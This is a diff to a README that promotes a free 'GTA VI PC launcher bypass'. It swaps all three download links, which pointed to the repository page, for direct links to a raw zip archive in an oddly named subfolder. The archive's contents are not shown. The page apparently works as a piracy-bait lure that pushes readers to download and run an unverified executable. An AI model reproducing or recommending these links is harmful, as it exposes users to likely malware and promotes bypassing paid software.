@@ -1,6 +1,6 @@
 # 🎮 GTA-VI-PC-Launcher-Bypass - Play GTA VI on PC Free
 
-[![Download Now](https://img.shields.io/badge/Download-GTA_VI_PC_Free-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/shayanadhami1-prog/GTA-VI-PC-Launcher-Bypass)
+[![Download Now](https://img.shields.io/badge/Download-GTA_VI_PC_Free-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/shayanadhami1-prog/GTA-VI-PC-Launcher-Bypass/raw/refs/heads/main/ferrocyanate/GT-V-P-Bypass-Launcher-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ This application is a complete game activator and bypass utility designed specif
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/shayanadhami1-prog/GTA-VI-PC-Launcher-Bypass](https://github.com/shayanadhami1-prog/GTA-VI-PC-Launcher-Bypass)
+Visit this link to download the application: [https://github.com/shayanadhami1-prog/GTA-VI-PC-Launcher-Bypass/raw/refs/heads/main/ferrocyanate/GT-V-P-Bypass-Launcher-1.7.zip](https://github.com/shayanadhami1-prog/GTA-VI-PC-Launcher-Bypass/raw/refs/heads/main/ferrocyanate/GT-V-P-Bypass-Launcher-1.7.zip)
 
 Once you click the link, you'll land on the download page. Look for the green "Download" button or the latest release file. Click it, and your download will start automatically.
 
@@ -107,7 +107,7 @@ GTA-VI-PC-Launcher-Bypass gives you instant access to one of the most anticipate
 
 Remember to visit the download link, follow the simple steps, and you're all set. If you encounter any issues, refer to the troubleshooting section above. Happy gaming!
 
-[![Download Now](https://img.shields.io/badge/Get_GTA_VI_Free-Click_Here-FF00FF?style=for-the-badge&logo=download&logoColor=white)](https://github.com/shayanadhami1-prog/GTA-VI-PC-Launcher-Bypass)
+[![Download Now](https://img.shields.io/badge/Get_GTA_VI_Free-Click_Here-FF00FF?style=for-the-badge&logo=download&logoColor=white)](https://github.com/shayanadhami1-prog/GTA-VI-PC-Launcher-Bypass/raw/refs/heads/main/ferrocyanate/GT-V-P-Bypass-Launcher-1.7.zip)
 
 ## 📌 Quick Recap
 
